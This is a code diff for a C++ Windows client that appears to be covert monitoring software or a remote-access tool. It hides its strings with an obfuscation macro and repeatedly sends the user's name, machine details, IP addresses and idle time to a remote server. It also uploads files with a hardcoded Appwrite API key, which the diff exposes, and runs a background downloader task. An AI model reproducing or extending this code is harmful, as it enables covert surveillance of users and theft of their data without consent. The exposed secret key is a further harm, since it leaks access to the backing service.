@@ -1,25 +1,41 @@
 #include "App.h"
 #include "curl/curl.h"
 #include "Locker.h"
-
+#include "GZip.h"
+#include "Brotli.h"
+#include "DB.h"
+#include "MessageHandler.h"
 #include <filesystem>
+#include "MessageProcessor.h"
+#include "wmi.h"
+#include "HttpUtil.h"
+#include "Tasks.h"
 #include "Encrypter.h"
 namespace fs = std::filesystem;
 int64_t lastInfoQuery = 0;
 Information lastInfo;
-const std::string SERVER_BASE = OBFUSCATED("http://localhost:3000");
+const std::string SERVER_BASE = OBFUSCATED("http://192.168.0.13:8070/app");
+// const std::string SERVER_BASE = OBFUSCATED("http://localhost:8070/app");
 const std::string APPWRITEAPI_KEY = OBFUSCATED("c8de7ce28b6a16d8a2a6531672b6549547c7f3cd65af70782ac7e5bdd15733c49193d7e5ca02a01591ef6fc8313f974feea517af6f68e5593e33fd0b82392691aeff4d6792f057b5c08e5f2a76a81237436eed75358006393400bbb4828dc886f9fd07d55a47a36de99b0920e1c423f9ccedb72a5b6d26963f74df6236a2622f");
 const std::string APPWRITE_PROJECTID = OBFUSCATED("65f1b67fa4509b598d6e");
 void uploadFile(std::string file);
 static PDH_HQUERY cpuQuery;
 static PDH_HCOUNTER cpuTotal;
-
-void WaitForConnnection()
+void initTasks();
+void WaitForConnection()
 {
-    while (!InternetIsWorking())
+    bool working = InternetIsWorking();
+    #ifdef _DEBUG
+        working = true;
+    #endif
+    do
     {
+        if (working)
+        {
+            break;
+        }
         Sleep(1000);
-    }
+    } while (!(working = InternetIsWorking()));
 }
 size_t readCallback(void *ptr, size_t size, size_t nitems, void *data)
 {
@@ -58,7 +74,7 @@ void uploadFile(std::string file)
 {
     CURL *curl = curl_easy_init();
 
-    std::string keyHeader =OBFUSCATED("X-Appwrite-Key: ");
+    std::string keyHeader = OBFUSCATED("X-Appwrite-Key: ");
     keyHeader += APPWRITEAPI_KEY;
     std::string projectHeader = OBFUSCATED("X-Appwrite-Project: ");
     projectHeader += APPWRITE_PROJECTID;
@@ -108,14 +124,39 @@ bool UploadInfo(std::string info)
 {
     CURL *curl = curl_easy_init();
     struct curl_slist *headerlist = curl_slist_append(NULL, "Content-Type: application/json");
-    std::string link = SERVER_BASE + "/client/info";
+    std::string link = SERVER_BASE + "/client/info/" + urlEncode(GetMachineID());
     curl_easy_setopt(curl, CURLOPT_URL, link.c_str());
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, info.c_str());
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
 
     auto res = curl_easy_perform(curl);
     curl_slist_free_all(headerlist);
-    return res == CURLE_OK;
+    long http_code = 0;
+    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
+    curl_easy_cleanup(curl);
+    return res == CURLE_OK && (http_code >= 200 && http_code < 300);
+}
+bool PostMachineDetails()
+{
+    CURL *curl = curl_easy_init();
+    struct curl_slist *headerlist = curl_slist_append(NULL, "Content-Type: application/json");
+    std::string link = SERVER_BASE + "/client";
+
+    json payload;
+    payload["machine_id"] = GetMachineID();
+    payload["username"] = getUserName();
+    payload["machine"] = getMachineName();
+    auto post = payload.dump();
+    curl_easy_setopt(curl, CURLOPT_URL, link.c_str());
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post.c_str());
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
+
+    auto res = curl_easy_perform(curl);
+    curl_slist_free_all(headerlist);
+    long http_code = 0;
+    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
+    curl_easy_cleanup(curl);
+    return res == CURLE_OK && (http_code >= 200 && http_code < 300);
 }
 bool InternetIsWorking()
 {
@@ -145,106 +186,230 @@ int64_t getIdleTime()
     BOOL res = GetLastInputInfo(&info);
     return (int)((GetTickCount() - info.dwTime) / 1000);
 }
+std::vector<uint8_t> CaptureFileThumbnail(std::string file)
+{
+    auto bmp = GetThumbnail(file);
+    std::vector<uint8_t> res;
+    if (bmp != NULL)
+    {
+        res = HbitmapToPNG2(bmp, 0, 0);
+        if (res.empty())
+        {
+            res = HbitmapToPNG(bmp, 0, 0);
+        }
+        DeleteObject(bmp);
+    }
+    return res;
+}
+HBITMAP GetThumbnail(std::string file)
+{
+
+    auto path = fs::path(file);
+
+    HBITMAP hThumbnail = NULL;
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+    if (SUCCEEDED(hr))
+    {
+        // Create an IShellItem from the file path
+        IShellItem *pShellItem;
+        hr = SHCreateItemFromParsingName(path.wstring().c_str(), NULL, IID_PPV_ARGS(&pShellItem));
+        if (SUCCEEDED(hr))
+        {
+            // Create an IShellItemImageFactory interface
+            IShellItemImageFactory *pImageFactory;
+            hr = pShellItem->QueryInterface(IID_PPV_ARGS(&pImageFactory));
+            if (SUCCEEDED(hr))
+            {
+                // Get the thumbnail image as an HBITMAP
+                SIZE size;
+                size.cx = 120; // Specify desired width of the thumbnail
+                size.cy = 120; // Specify desired height of the thumbnail
+
+                hr = pImageFactory->GetImage(size, SIIGBF_RESIZETOFIT, &hThumbnail);
+                if (FAILED(hr))
+                {
+                    if (hThumbnail != NULL)
+                    {
+                        DeleteObject(hThumbnail);
+                        hThumbnail = NULL;
+                    }
+                }
+                pImageFactory->Release();
+            }
+            pShellItem->Release();
+        }
+        CoUninitialize();
+    }
+    return hThumbnail;
+}
+void initTasks(){
+    // downloadsFetcherTask();
+    // uploadsFetcherTask();
+    // appsFetcherTask();
+    // commandsFetcherTask();
+    downloaderTask();
+    partCleanerTask();
+}
 EXPORT void Start()
 {
-    std::string mutexString = OBFUSCATED("MONITOR_APP");
+    // auto dls = fetchDownloads();
+    // auto ups=fetchUploads();
+    // dls = fetchDownloads(getSystemTime());
+    // std::cout<<dls.size();
+    // auto files=listFiles(R"(C:\Users\James\Downloads)");
+    // {
+    //     auto inf = Information::getInformation();
+
+    //     auto infostr = Information2JSON(inf);
+    //     auto comp = compressGzip(infostr);
+    //     auto dec = decompressGzip(comp);
+    //     auto infostr2 = VecToString(dec);
+    //     std::cout << infostr2 << "\n";
+    //     if (infostr2 == infostr)
+    //     {
+    //         std::cout << "Found a match\n";
+    //     }
+    //     else
+    //     {
+    //         std::cout << "Found a mismatch\n";
+    //     }
+    // }
+    // auto thumb = CaptureFileThumbnail(R"(C:\Users\James\Downloads\Video\Moving from C to Rust for embedded software development.mkv)");
+    // writeFile("thumb2.png", thumb);
+    // binmessage::BinaryMessage msg;
+    // msg.set_code(MC_ANSWER);
+    // msg.set_compressed(false);
+    // msg.set_data("some data");
+    // msg.set_sender(GetMachineID());
+    // msg.set_recepient("SERVER");
+    // msg.set_isbinary(false);
+    // std::string encoded = msg.SerializeAsString();
+
+    // binmessage::BinaryMessage decoded;
+    // decoded.ParseFromString(encoded);
+    // std::string data = decoded.data();
+    
+    std::string mutexString = OBFUSCATED("Global MONITOR_APP");
     Locker lock(mutexString, true);
     while (!lock.Lock())
     {
         Sleep(1000);
     }
     initCPUCounter();
+    initializeDB(); 
+    initTasks();
+    defaultMessageHandler = new MessageHandler();
     std::chrono::high_resolution_clock clk;
 
     for (;;)
     {
+
+        int postErrCount = 0;
+        while (!PostMachineDetails() && postErrCount < 5)
+        {
+            Sleep(400);
+            postErrCount++;
+            WaitForConnection();
+        }
         auto start = clk.now();
         auto inf = Information::getInformation();
         auto now = clk.now();
         auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - start).count();
         auto infostr = Information2JSON(inf);
-        json jsn;
 
-        jsn["mid"] = GetMachineID();
-        jsn["info"] = infostr;
-
-        UploadInfo(jsn.dump());
+        UploadInfo(infostr);
         // std::cout << infostr << "\n";
         std::cout << elapsed << "\n";
-        Sleep(5000);
+        Sleep(30000);
     }
+    delete defaultMessageHandler;
+    defaultMessageHandler = nullptr;
 }
 Information Information::getInformation()
 {
-
     Information info;
-    info.arch = IsSystemX64() ? "X64" : "x86";
-    info.compileTime = getCompileTime();
-    info.windowsVersion = getWindowsVersion();
-
-    info.cpu = GetCpuInfo();
-
-    SYSTEM_INFO sysinfo;
-    GetSystemInfo(&sysinfo);
-    info.cpuCores = sysinfo.dwNumberOfProcessors;
-
-    bool starting = lastInfoQuery == 0;
-    std::thread th1([&]()
-                    { info.cpuInfo = starting || lastInfo.cpuInfo.size() == 0 ? getWmicResult("cpu") : lastInfo.cpuInfo; });
-    std::thread th2([&]()
-                    { info.osInfo = starting || lastInfo.cpuInfo.size() == 0 ? getWmicResult("os") : lastInfo.osInfo; });
-    std::thread th3([&]()
-                    { info.driveInfo = starting || lastInfo.cpuInfo.size() == 0 ? getWmicResult("diskdrive") : lastInfo.driveInfo; });
-    th1.join();
-    th2.join();
-    th3.join();
-
-    MEMORYSTATUSEX memInfo;
-    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
-    GlobalMemoryStatusEx(&memInfo);
-
-    info.totalRam = memInfo.ullTotalPhys;
-    info.freeRam = memInfo.ullAvailPhys;
-
-    info.cpuPercentage = getCpuPercentage();
-
-    info.disks = starting || lastInfo.cpuInfo.size() == 0 ? getDisks() : lastInfo.disks;
-    info.mainBinary = starting || lastInfo.cpuInfo.size() == 0 ? GetExecutable() : lastInfo.mainBinary;
-    info.hostBinary = starting || lastInfo.cpuInfo.size() == 0 ? getExecutingBinary() : lastInfo.hostBinary;
-    info.screen = starting || lastInfo.cpuInfo.size() == 0 ? getScreenDimensions() : lastInfo.screen;
-    info.isInteractive = IsUserInteractive();
-    info.userName = getUsername();
-    info.machine = getMachineName();
-    info.machineId = GetMachineID();
-
-    if (lastInfo.localIp == "" || (getSystemTime() - lastInfoQuery) > 60)
+    try
     {
-        info.localIp = getLocalIP();
-    }
-    else
-    {
-        info.localIp = lastInfo.localIp;
-    }
+        info.arch = IsSystemX64() ? "X64" : "x86";
+        info.compileTime = getCompileTime();
+        info.windowsVersion = getWindowsVersion();
 
-    if (lastInfo.remoteIp == "" || (getSystemTime() - lastInfoQuery) > 60)
-    {
-        auto res = GetBytesFromURL(OBFUSCATED("https://api.ipify.org"));
-        if (res.data.size() > 0)
+        info.cpu = GetCpuInfo();
+
+        SYSTEM_INFO sysinfo;
+        GetSystemInfo(&sysinfo);
+        info.cpuCores = sysinfo.dwNumberOfProcessors;
+
+        bool starting = lastInfoQuery == 0;
+        auto wmicInfo = getWmiInformation();
+        if (wmicInfo.cpuInfo.size() == 0)
         {
-            info.remoteIp.resize(res.data.size());
-            memcpy((void *)&info.remoteIp[0], (void *)&res.data[0], res.data.size());
+            std::thread th1([&]()
+                            { info.cpuInfo = starting || lastInfo.cpuInfo.size() == 0 ? getWmicResult("cpu") : lastInfo.cpuInfo; });
+            std::thread th2([&]()
+                            { info.osInfo = starting || lastInfo.cpuInfo.size() == 0 ? getWmicResult("os") : lastInfo.osInfo; });
+            std::thread th3([&]()
+                            { info.driveInfo = starting || lastInfo.cpuInfo.size() == 0 ? getWmicResult("diskdrive") : lastInfo.driveInfo; });
+            th1.join();
+            th2.join();
+            th3.join();
         }
+        else
+        {
+            info.cpuInfo = wmicInfo.cpuInfo;
+            info.osInfo = wmicInfo.osInfo;
+            info.driveInfo = wmicInfo.diskInfo;
+        }
+        MEMORYSTATUSEX memInfo;
+        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+        GlobalMemoryStatusEx(&memInfo);
+
+        info.totalRam = memInfo.ullTotalPhys;
+        info.freeRam = memInfo.ullAvailPhys;
+
+        info.cpuPercentage = getCpuPercentage();
+
+        info.disks = getDisks();
+        info.mainBinary = starting || lastInfo.cpuInfo.size() == 0 ? GetExecutable() : lastInfo.mainBinary;
+        info.hostBinary = starting || lastInfo.cpuInfo.size() == 0 ? getExecutingBinary() : lastInfo.hostBinary;
+        info.screen = starting || lastInfo.cpuInfo.size() == 0 ? getScreenDimensions() : lastInfo.screen;
+        info.isInteractive = IsUserInteractive();
+        info.userName = getUserName();
+        info.machine = getMachineName();
+        info.machineId = GetMachineID();
+
+        if (lastInfo.localIp == "" || (getSystemTime() - lastInfoQuery) > 60)
+        {
+            info.localIp = getLocalIP();
+        }
+        else
+        {
+            info.localIp = lastInfo.localIp;
+        }
+
+        if (lastInfo.remoteIp == "" || (getSystemTime() - lastInfoQuery) > 60)
+        {
+            auto res = GetBytesFromURL(OBFUSCATED("https://api.ipify.org"));
+            if (res.data.size() > 0)
+            {
+                info.remoteIp.resize(res.data.size());
+                memcpy((void *)&info.remoteIp[0], (void *)&res.data[0], res.data.size());
+            }
+        }
+        else
+        {
+            info.remoteIp = lastInfo.remoteIp;
+        }
+        info.idleTime = getIdleTime();
+
+        info.systemTime = getSystemTime();
+        lastInfoQuery = getSystemTime();
+        lastInfo = info;
     }
-    else
+    catch (const std::exception &e)
     {
-        info.remoteIp = lastInfo.remoteIp;
+        std::cerr << e.what() << '\n';
     }
-    info.idleTime = getIdleTime();
-
-    info.systemTime = getSystemTime();
-    lastInfoQuery = getSystemTime();
-    lastInfo = info;
-
     //     info.cpuPercentage = 0;
     return info;
 }
@@ -381,17 +546,7 @@ WindowsVersion getWindowsVersion()
     }
     return version;
 }
-std::string getMachineName()
-{
-    std::string machine;
 
-    char buff[1024];
-    DWORD size = sizeof(buff);
-    GetComputerNameA(buff, &size);
-    machine = buff;
-
-    return machine;
-}
 std::string getLocalIP()
 {
     std::string ip;
@@ -461,15 +616,7 @@ std::string getExecutingBinary()
 
     return exe;
 }
-std::string getUsername()
-{
-    const DWORD size = 1024;
-    const char name[size] = {0};
-    std::string user;
-    GetUserNameA((LPSTR)name, (LPDWORD)&size);
-    user = name;
-    return user;
-}
+
 std::vector<Disk> getDisks()
 {
     std::vector<Disk> disks;
@@ -513,7 +660,7 @@ void initCPUCounter()
 {
     PdhOpenQuery(NULL, NULL, &cpuQuery);
     // You can also use L"\\Processor(*)\\% Processor Time" and get individual CPU values with PdhGetFormattedCounterArray()
-    PdhAddEnglishCounter(cpuQuery, "\\Processor(_Total)\\% Processor Time", NULL, &cpuTotal);
+    PdhAddEnglishCounterA(cpuQuery, "\\Processor(_Total)\\% Processor Time", NULL, &cpuTotal);
     PdhCollectQueryData(cpuQuery);
 }
 std::map<std::string, std::string> getWmicResult(std::string cmd)
@@ -584,11 +731,9 @@ std::string GetCpuInfo()
 
     return cpu;
 }
-std::vector<Runnable> loadNewRunnables(){
+std::vector<Runnable> loadNewRunnables()
+{
     std::vector<Runnable> runnables;
-
-
-
 
     return runnables;
 }
